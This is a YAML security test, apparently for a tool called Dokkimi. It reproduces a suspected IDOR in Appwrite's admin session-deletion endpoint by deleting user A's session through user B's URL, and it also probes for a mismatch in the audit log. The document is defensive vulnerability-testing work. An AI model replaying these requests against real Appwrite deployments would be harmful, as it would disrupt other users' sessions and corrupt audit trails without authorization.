name: appwrite-session-idor
description: |
  Probe Appwrite for cross-user session deletion: the admin
  DELETE /v1/users/:userId/sessions/:sessionId endpoint fetches user and
  session independently without verifying the session belongs to the user.
  A session owned by user A can be deleted via user B's endpoint.
config:
  timeoutSeconds: 600
items:
  - $ref: ../shared/appwrite-mariadb.yaml
  - $ref: ../shared/appwrite-redis.yaml
  - $ref: ../shared/appwrite-worker-db.yaml
  - $ref: ../shared/appwrite-api.yaml
variables:
  adminEmail: admin@dokkimi.test
  adminPassword: TestPass123!
  projectId: dokkimi-idor-test
tests:
  - name: Cross-user session deletion IDOR
    steps:
      - name: Register admin account
        action:
          type: httpRequest
          method: POST
          url: appwrite/v1/account
          headers:
            Content-Type: application/json
            X-Appwrite-Project: console
          body:
            userId: 'unique()'
            email: '{{adminEmail}}'
            password: '{{adminPassword}}'
            name: Admin
        extract:
          adminId: $.response.body.$id
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 201

      - name: Create admin session
        action:
          type: httpRequest
          method: POST
          url: appwrite/v1/account/sessions/email
          headers:
            Content-Type: application/json
            X-Appwrite-Project: console
          body:
            email: '{{adminEmail}}'
            password: '{{adminPassword}}'
        extract:
          fallbackCookies: $.response.headers.x-fallback-cookies
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 201

      - name: Create team
        action:
          type: httpRequest
          method: POST
          url: appwrite/v1/teams
          headers:
            Content-Type: application/json
            X-Appwrite-Project: console
            X-Fallback-Cookies: '{{fallbackCookies}}'
          body:
            teamId: 'unique()'
            name: IDOR Test Org
        extract:
          teamId: $.response.body.$id
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 201

      - name: Create project
        action:
          type: httpRequest
          method: POST
          url: appwrite/v1/projects
          headers:
            Content-Type: application/json
            X-Appwrite-Project: console
            X-Fallback-Cookies: '{{fallbackCookies}}'
          body:
            projectId: '{{projectId}}'
            name: IDOR Test Project
            teamId: '{{teamId}}'
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 201

      - name: Create API key
        action:
          type: httpRequest
          method: POST
          url: appwrite/v1/projects/{{projectId}}/keys
          headers:
            Content-Type: application/json
            X-Appwrite-Project: console
            X-Fallback-Cookies: '{{fallbackCookies}}'
          body:
            name: IDOR Test Key
            scopes:
              - users.read
              - users.write
        extract:
          apiKey: $.response.body.secret
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 201

      # --- Create two users ---

      - name: Create user A
        action:
          type: httpRequest
          method: POST
          url: appwrite/v1/users
          headers:
            Content-Type: application/json
            X-Appwrite-Project: '{{projectId}}'
            X-Appwrite-Key: '{{apiKey}}'
          body:
            userId: 'unique()'
            email: usera@dokkimi.test
            password: UserAPass123!
            name: User A
        extract:
          userAId: $.response.body.$id
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 201

      - name: Create user B
        action:
          type: httpRequest
          method: POST
          url: appwrite/v1/users
          headers:
            Content-Type: application/json
            X-Appwrite-Project: '{{projectId}}'
            X-Appwrite-Key: '{{apiKey}}'
          body:
            userId: 'unique()'
            email: userb@dokkimi.test
            password: UserBPass123!
            name: User B
        extract:
          userBId: $.response.body.$id
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 201

      # --- Create session for user A via admin API ---

      - name: Create session for user A
        action:
          type: httpRequest
          method: POST
          url: appwrite/v1/users/{{userAId}}/sessions
          headers:
            Content-Type: application/json
            X-Appwrite-Project: '{{projectId}}'
            X-Appwrite-Key: '{{apiKey}}'
        extract:
          sessionAId: $.response.body.$id
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 201

      - name: Verify user A has exactly 1 session
        action:
          type: httpRequest
          method: GET
          url: appwrite/v1/users/{{userAId}}/sessions
          headers:
            X-Appwrite-Project: '{{projectId}}'
            X-Appwrite-Key: '{{apiKey}}'
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 200
              - path: $.response.body.total
                operator: eq
                value: 1

      # ==========================================
      # PROBE: Delete user A's session via user B's
      # endpoint. The admin DELETE endpoint at
      # users.php:2447-2470 fetches user and session
      # independently. No check that
      # session.userId === userId.
      # Expected: 404 or 403 (session not found for this user)
      # Bug: 204 (session deleted regardless of user)
      # ==========================================

      - name: 'PROBE: Delete user A session via user B endpoint'
        stopOnFailure: false
        action:
          type: httpRequest
          method: DELETE
          url: appwrite/v1/users/{{userBId}}/sessions/{{sessionAId}}
          headers:
            X-Appwrite-Project: '{{projectId}}'
            X-Appwrite-Key: '{{apiKey}}'
        assertions:
          - assertions:
              - path: $.response.status
                operator: in
                value: [204, 403, 404]

      # ==========================================
      # VERIFY: Check if user A's session was
      # actually deleted. If the IDOR bug exists,
      # user A will have 0 sessions now.
      # ==========================================

      - name: 'VERIFY: Check user A sessions after cross-user delete'
        stopOnFailure: false
        action:
          type: httpRequest
          method: GET
          url: appwrite/v1/users/{{userAId}}/sessions
          headers:
            X-Appwrite-Project: '{{projectId}}'
            X-Appwrite-Key: '{{apiKey}}'
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 200

      # ==========================================
      # PROBE: Also test with completely wrong user ID
      # Does providing a non-existent user still allow
      # deletion of a valid session?
      # ==========================================

      - name: Create another session for user A
        action:
          type: httpRequest
          method: POST
          url: appwrite/v1/users/{{userAId}}/sessions
          headers:
            Content-Type: application/json
            X-Appwrite-Project: '{{projectId}}'
            X-Appwrite-Key: '{{apiKey}}'
        extract:
          sessionA2Id: $.response.body.$id
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 201

      # ==========================================
      # PROBE: Audit trail mismatch — the endpoint
      # logs userId from the URL, not from the session.
      # If userB's ID is in the URL but session belongs
      # to userA, the audit says "userB deleted session"
      # when it was actually userA's session.
      # ==========================================

      - name: 'PROBE: Delete session via wrong user (audit mismatch)'
        stopOnFailure: false
        action:
          type: httpRequest
          method: DELETE
          url: appwrite/v1/users/{{userBId}}/sessions/{{sessionA2Id}}
          headers:
            X-Appwrite-Project: '{{projectId}}'
            X-Appwrite-Key: '{{apiKey}}'
        assertions:
          - assertions:
              - path: $.response.status
                operator: in
                value: [204, 403, 404]

      - name: 'VERIFY: User A sessions after second cross-user delete'
        stopOnFailure: false
        action:
          type: httpRequest
          method: GET
          url: appwrite/v1/users/{{userAId}}/sessions
          headers:
            X-Appwrite-Project: '{{projectId}}'
            X-Appwrite-Key: '{{apiKey}}'
        assertions:
          - assertions:
              - path: $.response.status
                operator: eq
                value: 200

      # Cleanup
      - name: Delete user A
        stopOnFailure: false
        action:
          type: httpRequest
          method: DELETE
          url: appwrite/v1/users/{{userAId}}
          headers:
            X-Appwrite-Project: '{{projectId}}'
            X-Appwrite-Key: '{{apiKey}}'
        assertions:
          - assertions:
              - path: $.response.status
                operator: in
                value: [204, 404]

      - name: Delete user B
        stopOnFailure: false
        action:
          type: httpRequest
          method: DELETE
          url: appwrite/v1/users/{{userBId}}
          headers:
            X-Appwrite-Project: '{{projectId}}'
            X-Appwrite-Key: '{{apiKey}}'
        assertions:
          - assertions:
              - path: $.response.status
                operator: in
                value: [204, 404]
